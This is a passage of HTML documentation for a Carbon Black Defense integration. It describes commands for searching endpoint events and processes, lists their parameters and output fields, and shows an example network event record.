<td style="width: 542px;">Case sensitive.</td>
</tr>
<tr>
<td style="width: 161px;">ownerName</td>
<td style="width: 542px;">Owner name of the event to search for</td>
<td style="width: 542px;">Case <strong>in</strong>sensitive.</td>
</tr>
<tr>
<td style="width: 161px;">ownerNameExact</td>
<td style="width: 542px;">The exact owner name of the event to search for</td>
<td style="width: 542px;">Case sensitive.</td>
</tr>
<tr>
<td style="width: 161px;">ipAddress</td>
<td style="width: 542px;">
<p>External or internal IP address</p>
</td>
<td style="width: 542px;">
<p>-</p>
</td>
</tr>
<tr>
<td style="width: 161px;">sha256hash</td>
<td style="width: 542px;">
<p>Searches for events generated by a process with this SHA-256 hash</p>
</td>
<td style="width: 542px;">
<p>Must be in lowercase.</p>
</td>
</tr>
<tr>
<td style="width: 161px;">applicationName</td>
<td style="width: 542px;">
<p>Searches for events generated by a process with this application name</p>
</td>
<td style="width: 542px;">
<p>Must be in lowercase.</p>
</td>
</tr>
<tr>
<td style="width: 161px;">eventType</td>
<td style="width: 542px;">Searches for events associated with this event type</td>
<td style="width: 542px;">-</td>
</tr>
<tr>
<td style="width: 161px;">searchWindow</td>
<td style="width: 542px;">
<p>Events generated within this time frame</p>
</td>
<td style="width: 542px;">
<p>Default is one day.</p>
<p>Events might not be available after 30 days due to retention policies. </p>
</td>
</tr>
<tr>
<td style="width: 161px;">start</td>
<td style="width: 542px;">Shows result from this row and after</td>
<td style="width: 542px;"> -</td>
</tr>
<tr>
<td style="width: 161px;">rows</td>
<td style="width: 542px;">Maximum number of rows of result</td>
<td style="width: 542px;">This parameter can be limited on the Cb Defense server side.</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="height: 182px;" border="2" width="750" cellpadding="6">
<tbody>
<tr>
<td style="width: 551px;"><strong> Path</strong></td>
<td style="width: 209px;"> <strong>Description</strong>
</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.EventType</td>
<td style="width: 209px;">Event type</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.ProcessDetails.MilisSinceProcessStart</td>
<td style="width: 209px;">Milliseconds since the beginning of the process</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.ProcessDetails.Name</td>
<td style="width: 209px;">Name</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.ProcessDetails.PrivatePid</td>
<td style="width: 209px;">Private PID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.ProcessDetails.ProcessId</td>
<td style="width: 209px;">Process ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.ShortDescription</td>
<td style="width: 209px;">Short description</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.CreateTime</td>
<td style="width: 209px;">Time of creation</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceName</td>
<td style="width: 209px;">Device name</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceVersion</td>
<td style="width: 209px;">Device version</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.PolicyName</td>
<td style="width: 209px;">Policy name</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.TargetPriorityType</td>
<td style="width: 209px;">Target priority type</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.AgentLocation</td>
<td style="width: 209px;">Agent location</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceId</td>
<td style="width: 209px;">Device ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceIpV4Address</td>
<td style="width: 209px;">IpV4 address of the device</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceLocation.AreaCode</td>
<td style="width: 209px;">Area code</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceLocation.CountryCode</td>
<td style="width: 209px;">Country code</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceLocation.Latitude</td>
<td style="width: 209px;">Latitude</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceLocation.Longitude</td>
<td style="width: 209px;">Longitude</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceLocation.City</td>
<td style="width: 209px;">City</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceLocation.CountryName</td>
<td style="width: 209px;">Country name</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceLocation.DmaCode</td>
<td style="width: 209px;">DMA code</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceLocation.MetroCode</td>
<td style="width: 209px;">Metro code</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceLocation.PostalCode</td>
<td style="width: 209px;">Postal code</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceLocation.Region</td>
<td style="width: 209px;">Region</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceIpAddress</td>
<td style="width: 209px;">Device IP address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.DeviceType</td>
<td style="width: 209px;">Device type</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.Email</td>
<td style="width: 209px;">Email address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.DeviceDetails.TargetPriorityCode</td>
<td style="width: 209px;">Target priority code</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.EventId</td>
<td style="width: 209px;">Event ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.EventTime</td>
<td style="width: 209px;">Event time</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.LongDescription</td>
<td style="width: 209px;">Long description</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.NetFlow.DestAddress</td>
<td style="width: 209px;">Dest address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.NetFlow.DestPort</td>
<td style="width: 209px;">Dest port</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.NetFlow.PeerFqdn</td>
<td style="width: 209px;">Peer Fqdn</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.NetFlow.PeerIpAddress</td>
<td style="width: 209px;">Peer IP address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.NetFlow.PeerIpV4Address</td>
<td style="width: 209px;">Peer IpV4 address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.NetFlow.Service</td>
<td style="width: 209px;">Service</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.NetFlow.SourceAddress</td>
<td style="width: 209px;">Source address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.NetFlow.SourcePort</td>
<td style="width: 209px;">Source port</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.SelectedApp.ApplicationName</td>
<td style="width: 209px;">Application name</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.SelectedApp.ApplicationPath</td>
<td style="width: 209px;">Application path</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.SelectedApp.Md5Hash</td>
<td style="width: 209px;">MD5 hash</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.SelectedApp.Sha256Hash</td>
<td style="width: 209px;">SHA-256 hash</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.FindEvents.Results.ThreatIndicators</td>
<td style="width: 209px;">Threat indicators</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<p><code>!cbd-find-events rows=1</code>&lt;/p?</p>
<h5>Context Example</h5>
<pre>CarbonBlackDefense:{} 1 item
FindEvents:{} 2 items
Results:{} 10 items
ShortDescription:The application "cloud-drive-ui" successfully closed a TCP/6690 connection to 192.168.2.22:6690 (192.168.2.22).
LongDescription:The application "/Users/cberninger/.CloudStation/CloudStation.app/Contents/MacOS/cloud-drive-ui" closed a TCP/6690 connection to 192.168.2.22:6690 (192.168.2.22) from 192.168.2.125:56001. There were 8169 Bytes Received and 2863 Bytes Sent in less than 1 second. The device was off the corporate network using the public address 67.143.208.113 (192.168.2.125, located in United States). The operation was successful.
SelectedApp:{} 7 items
ApplicationName:cloud-drive-ui
ApplicationPath:/Users/cberninger/.CloudStation/CloudStation.app/Contents/MacOS/cloud-drive-ui
EffectiveReputation:LOCAL_WHITE
EffectiveReputationSource:PRE_EXISTING
Md5Hash:b43632f807770d141008deb988a65ad9
ReputationProperty:NOT_LISTED
Sha256Hash:f649ce0c8d5ca63be86e00877632c6390af772eed86c07b3db5b818c30ab700b
EventTime:1533649991975
CreateTime:1533650036964
DeviceDetails:{} 12 items
DeviceName:cberninger-mac2
DeviceVersion:MAC OS X 10.10.5
TargetPriorityCode:1
DeviceLocation:{} 6 items
City:null
CountryCode:US
CountryName:United States
Latitude:37.751007
Longitude:-97.822
Region:null
TargetPriorityType:MEDIUM
DeviceType:MAC
DeviceId:844355
DeviceIpAddress:67.143.208.113
DeviceIpV4Address:67.143.208.113
AgentLocation:OFFSITE
Email:cberninger
PolicyName:default
TargetApp:{} 5 items
ApplicationName:null
EffectiveReputation:null
EffectiveReputationSource:null
ReputationProperty:null
Sha256Hash:null
ProcessDetails:{} 11 items
FullUserName:cberninger
PrivatePid:1071-1533502548722-245
ProcessId:1071
Name:cloud-drive-ui
TargetCommandLine:null
MilisSinceProcessStart:147443253
UserName:cberninger
TargetPrivatePid:null
TargetPid:null
TargetName:null
CommandLine:null
EventType:NETWORK
EventId:4ad25ae99a4911e88515b3c49ffeda59
TotalResults:{} 1 item
TotalResults:10666
Endpoint:{} 4 items
Domain:null
Hostname:cberninger-mac2
IPAddress:67.143.208.113
OS:MAC
Process:{} 9 items
Path:null
SHA1:null
ParentID:null
PID:1071
Name:cloud-drive-ui
Endpoint:null
ParentName:null
MD5:null
CommandLine:null
</pre>
<h5>Human Readable</h5>
<table style="width: 606px;" border="2" cellpadding="6">
<thead>
<tr>
<th style="width: 303px;">CreateTime</th>
<th style="width: 276px;">1533650036964</th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 303px;">DeviceDetails AgentLocation</td>
<td style="width: 276px;">OFFSITE</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceId</td>
<td style="width: 276px;">844355</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceIpAddress</td>
<td style="width: 276px;">67.143.208.113</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceIpV4Address</td>
<td style="width: 276px;">67.143.208.113</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation City</td>
<td style="width: 276px;"> </td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation CountryCode</td>
<td style="width: 276px;">US</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation CountryName</td>
<td style="width: 276px;">United States</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation Latitude</td>
<td style="width: 276px;">37.751007</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation Longitude</td>
<td style="width: 276px;">-97.822</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation Region</td>
<td style="width: 276px;"> </td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceName</td>
<td style="width: 276px;">cberninger-mac2</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceType</td>
<td style="width: 276px;">MAC</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceVersion</td>
<td style="width: 276px;">MAC OS X 10.10.5</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails Email</td>
<td style="width: 276px;">cberninger</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails PolicyName</td>
<td style="width: 276px;">default</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails TargetPriorityCode</td>
<td style="width: 276px;">1</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails TargetPriorityType</td>
<td style="width: 276px;">MEDIUM</td>
</tr>
<tr>
<td style="width: 303px;">EventId</td>
<td style="width: 276px;">4ad25ae99a4911e88515b3c49ffeda59</td>
</tr>
<tr>
<td style="width: 303px;">EventTime</td>
<td style="width: 276px;">1533649991975</td>
</tr>
</tbody>
</table>
<p> </p>
<h3 id="h_9672007832831529924411931">Get a specified event</h3>
<hr>
<p>Returns a the details of a specified event.</p>
<h5>Base Command</h5>
<p><code>cbd-find-event</code></p>
<h5>Input</h5>
<table style="width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 161px;">eventId</td>
<td style="width: 542px;">Event ID</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 751px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 441px;"><strong> Path</strong></td>
<td style="width: 366px;"> <strong>Description</strong>
</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ShortDescription</td>
<td style="width: 366px;">Short description</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.TargetHash.ApplicationName</td>
<td style="width: 366px;">Application name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.TargetHash.ReputationProperty</td>
<td style="width: 366px;">Reputation property</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.TargetHash.Sha256Hash</td>
<td style="width: 366px;">SHA-256 hash</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.EventType</td>
<td style="width: 366px;">Event type</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessHash.Md5Hash</td>
<td style="width: 366px;">MD5 hash</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessHash.Sha256Hash</td>
<td style="width: 366px;">SHA-256 hash</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessHash.ApplicationPath</td>
<td style="width: 366px;">Application path</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessHash.ReputationProperty</td>
<td style="width: 366px;">Reputation property</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessHash.ApplicationName</td>
<td style="width: 366px;">Application name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.OrgDetails.OrganizationId</td>
<td style="width: 366px;">Organization ID</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.OrgDetails.OrganizationName</td>
<td style="width: 366px;">Organization name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.OrgDetails.OrganizationType</td>
<td style="width: 366px;">Organization type</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ParentHash.ApplicationName</td>
<td style="width: 366px;">Application name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ParentHash.Sha256Hash</td>
<td style="width: 366px;">SHA-256 hash</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.EventId</td>
<td style="width: 366px;">Event ID</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.LongDescription</td>
<td style="width: 366px;">Long description</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceIpV4Address</td>
<td style="width: 366px;">Device IpV4 address</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceType</td>
<td style="width: 366px;">Device type</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.Email</td>
<td style="width: 366px;">Email address</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.TargetPriorityCode</td>
<td style="width: 366px;">Target priority code</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.AgentLocation</td>
<td style="width: 366px;">Agent location path</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceHostName</td>
<td style="width: 366px;">Device host name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceId</td>
<td style="width: 366px;">Device ID</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.GroupName</td>
<td style="width: 366px;">Group name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceVersion</td>
<td style="width: 366px;">Device version</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.TargetPriorityType</td>
<td style="width: 366px;">Target priority type</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceIpAddress</td>
<td style="width: 366px;">Device IP address</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceLocation.Latitude</td>
<td style="width: 366px;">Latitude</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceLocation.City</td>
<td style="width: 366px;">City</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceLocation.CountryCode</td>
<td style="width: 366px;">Country code</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceLocation.DmaCode</td>
<td style="width: 366px;">DMA code</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceLocation.Longitude</td>
<td style="width: 366px;">Longitude</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceLocation.MetroCode</td>
<td style="width: 366px;">Metro code</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceLocation.PostalCode</td>
<td style="width: 366px;">Postal code</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceLocation.Region</td>
<td style="width: 366px;">Region</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceLocation.AreaCode</td>
<td style="width: 366px;">Area code</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceLocation.CountryName</td>
<td style="width: 366px;">Country name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.DeviceDetails.DeviceName</td>
<td style="width: 366px;">Device name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.CreateTime</td>
<td style="width: 366px;">Time of creation</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.EventTime</td>
<td style="width: 366px;">Event time</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.FullUserName</td>
<td style="width: 366px;">Full user name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.Name</td>
<td style="width: 366px;">Name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.ParentCommandLine</td>
<td style="width: 366px;">Parent command line</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.ParentName</td>
<td style="width: 366px;">Parent name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.ParentPid</td>
<td style="width: 366px;">Parent PID</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.ProcessId</td>
<td style="width: 366px;">Process ID</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.CommandLine</td>
<td style="width: 366px;">Command line</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.MilisSinceProcessStart</td>
<td style="width: 366px;">Milisecconds since process start</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.TargetCommandLine</td>
<td style="width: 366px;">Target command line</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.TargetPid</td>
<td style="width: 366px;">Target PID</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.UserName</td>
<td style="width: 366px;">User name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.ParentPrivatePid</td>
<td style="width: 366px;">Parent private PID</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.PrivatePid</td>
<td style="width: 366px;">Private PID</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.TargetName</td>
<td style="width: 366px;">Target name</td>
</tr>
<tr>
<td style="width: 441px;">CarbonBlackDefense.GetAlertDetails.EventInfo.ProcessDetails.TargetPrivatePid</td>
<td style="width: 366px;">Target private PID</td>
</tr>
<tr>
<td style="width: 441px;"> CarbonBlackDefense.GetAlertDetails.EventInfo.ThreatIndicators</td>
<td style="width: 366px;">Threat indicators</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<p><code>!cbd-find-event eventId="4ad25ae99a4911e88515b3c49ffeda59"</code></p>
<h5>Context Example</h5>
<pre>CarbonBlackDefense:{} 1 item
FindEvent:{} 1 item
EventInfo:{} 13 items
ShortDescription:The application "cloud-drive-ui" successfully closed a TCP/6690 connection to 192.168.2.22:6690 (192.168.2.22).
LongDescription:The application "/Users/cberninger/.CloudStation/CloudStation.app/Contents/MacOS/cloud-drive-ui" closed a TCP/6690 connection to 192.168.2.22:6690 (192.168.2.22) from 192.168.2.125:56001. There were 8169 Bytes Received and 2863 Bytes Sent in less than 1 second. The device was off the corporate network using the public address 67.143.208.113 (192.168.2.125, located in United States). The operation was successful.
EventTime:1533649991975
CreateTime:1533650036964
DeviceDetails:{} 13 items
DeviceName:cberninger-mac2
DeviceVersion:MAC OS X 10.10.5
TargetPriorityCode:1
DeviceHostName:null
GroupName:null
DeviceLocation:{} 10 items
CountryName:United States
CountryCode:US
DmaCode:0
MetroCode:0
City:null
Latitude:37.751007
Longitude:-97.822
Region:null
PostalCode:null
AreaCode:0
TargetPriorityType:MEDIUM
DeviceType:MAC
DeviceId:844355
DeviceIpAddress:67.143.208.113
DeviceIpV4Address:67.143.208.113
AgentLocation:OFFSITE
Email:cberninger
ProcessDetails:{} 15 items
ParentPid:null
FullUserName:cberninger
PrivatePid:1071-1533502548722-245
ProcessId:1071
Name:cloud-drive-ui
TargetCommandLine:null
ParentPrivatePid:null
MilisSinceProcessStart:147443253
ParentName:null
ParentCommandLine:null
UserName:cberninger
TargetPrivatePid:null
TargetPid:null
TargetName:null
CommandLine:null
EventType:NETWORK
EventId:4ad25ae99a4911e88515b3c49ffeda59
ParentHash:{} 2 items
ApplicationName:null
Sha256Hash:null
ProcessHash:{} 5 items
ApplicationName:null
ApplicationPath:null
Md5Hash:null
ReputationProperty:null
Sha256Hash:null
ThreatIndicators:[] 2 items
0:UNKNOWN_APP
1:NETWORK_FLOW
OrgDetails:{} 3 items
OrganizationId:null
OrganizationName:null
OrganizationType:null
TargetHash:{} 3 items
ApplicationName:null
ReputationProperty:null
Sha256Hash:null
</pre>
<h5>Human Readable Output</h5>
<table style="width: 465px;" border="2" cellpadding="6">
<thead>
<tr>
<th style="width: 303px;">CreateTime</th>
<th style="width: 135px;">1533650036964</th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 303px;">DeviceDetails AgentLocation</td>
<td style="width: 135px;">OFFSITE</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceHostName</td>
<td style="width: 135px;"> </td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceId</td>
<td style="width: 135px;">844355</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceIpAddress</td>
<td style="width: 135px;">67.143.208.113</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceIpV4Address</td>
<td style="width: 135px;">67.143.208.113</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation AreaCode</td>
<td style="width: 135px;">0</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation City</td>
<td style="width: 135px;"> </td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation CountryCode</td>
<td style="width: 135px;">US</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation CountryName</td>
<td style="width: 135px;">United States</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation DmaCode</td>
<td style="width: 135px;">0</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation Latitude</td>
<td style="width: 135px;">37.751007</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation Longitude</td>
<td style="width: 135px;">-97.822</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation MetroCode</td>
<td style="width: 135px;">0</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation PostalCode</td>
<td style="width: 135px;"> </td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceLocation Region</td>
<td style="width: 135px;"> </td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceName</td>
<td style="width: 135px;">cberninger-mac2</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceType</td>
<td style="width: 135px;">MAC</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails DeviceVersion</td>
<td style="width: 135px;">MAC OS X 10.10.5</td>
</tr>
<tr>
<td style="width: 303px;">DeviceDetails Email</td>
<td style="width: 135px;">cberninger</td>
</tr>
</tbody>
</table>
<p> </p>
<h3 id="h_7036892073501529924420376">Get multiple processes</h3>
<hr>
<p>Returns the details of multiple process, as specified by further input.</p>
<h5>Base Command</h5>
<p><code>cbd-find-processes</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="6" cellpadding="2">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
<td style="width: 542px;"><strong>More Information</strong></td>
</tr>
<tr>
<td style="width: 161px;">hostNameExact</td>
<td style="width: 542px;">The exact hostname.</td>
<td style="width: 542px;">Case sensitive.</td>
</tr>
<tr>
<td style="width: 161px;">ownerName</td>
<td style="width: 542px;">Case insensitive owner name.</td>
<td style="width: 542px;">Case <strong>in</strong>sensitive.</td>
</tr>
<tr>
<td style="width: 161px;">ownerNameExact</td>
<td style="width: 542px;">
<p>Exact owner name</p>
</td>
<td style="width: 542px;">
<p>Case sensitive.</p>
</td>
</tr>
<tr>
<td style="width: 161px;">ipAddress</td>
<td style="width: 542px;">External or internal IP address</td>
<td style="width: 542px;"> -</td>
</tr>
<tr>
<td style="width: 161px;">searchWindow</td>
<td style="width: 542px;">
<p>Events generated within a given time frame</p>
</td>
<td style="width: 542px;">
<p>Default is one day.</p>
<p>Events may not be available after 30 days due to retention policies. </p>
</td>
</tr>
<tr>
<td style="width: 161px;">start</td>
